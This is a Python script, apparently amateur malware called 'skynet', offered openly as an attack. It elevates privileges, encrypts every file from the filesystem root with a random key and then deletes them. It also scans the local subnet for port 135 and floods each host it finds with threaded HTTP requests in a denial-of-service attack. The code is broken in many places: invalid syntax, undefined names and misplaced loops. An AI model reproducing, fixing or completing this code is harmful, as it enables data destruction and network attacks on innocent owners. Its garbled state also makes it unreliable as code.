# import required module
from encrypt import get_key, encrypt
import os
import sys
import elevate
import socket
import threading
import random 

elevate()

fake_ip = '192.168.2.' + random.randint(2, 255)
port = 80

net = 192.168.1.1
net1 = net.split('.')
a = '.'

net2 = net1[0] + a + net1[1] + a + net1[2] + a
st1 = 1
en1 = 256
en1 = en1 + 1
global targets =[]

def find_root():
    path = sys.executable
    while os.path.split(path)[1]:
        path = os.path.split(path)[0]
    return path

def skynet():
  Root_DIR = find_root()
  result = []
  Key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
  counter = 10
  
  for root, dirs, files in os.walk(Root_DIR):
    if file != "skynet.py":
          for file in files:
              result.append(os.path.join(root, file))
      return result

  while counter != 0:
    for file in get_files(Root_DIR):
            encrypt(get_key(Key), file)
    counter = counter - 1

  while file in Root_DIR:
    for file in get_files(Root_DIR):
      os.remove(file)
  
def DDOS(target):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

def scan(addr):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   socket.setdefaulttimeout(1)
   result = s.connect_ex((addr,135))
   if result == 0:
      return 1
   else :
      return 0

def run1():
   for ip in range(st1,en1):
      addr = net2 + str(ip)
      if (scan(addr)):
         target.append(addr)

for target in targets:
  for i in range(500):
    thread = threading.Thread(target=DDOS, (target))
    thread.start()

thread2 = threading.Thread(target=skynet)
thread2.start()   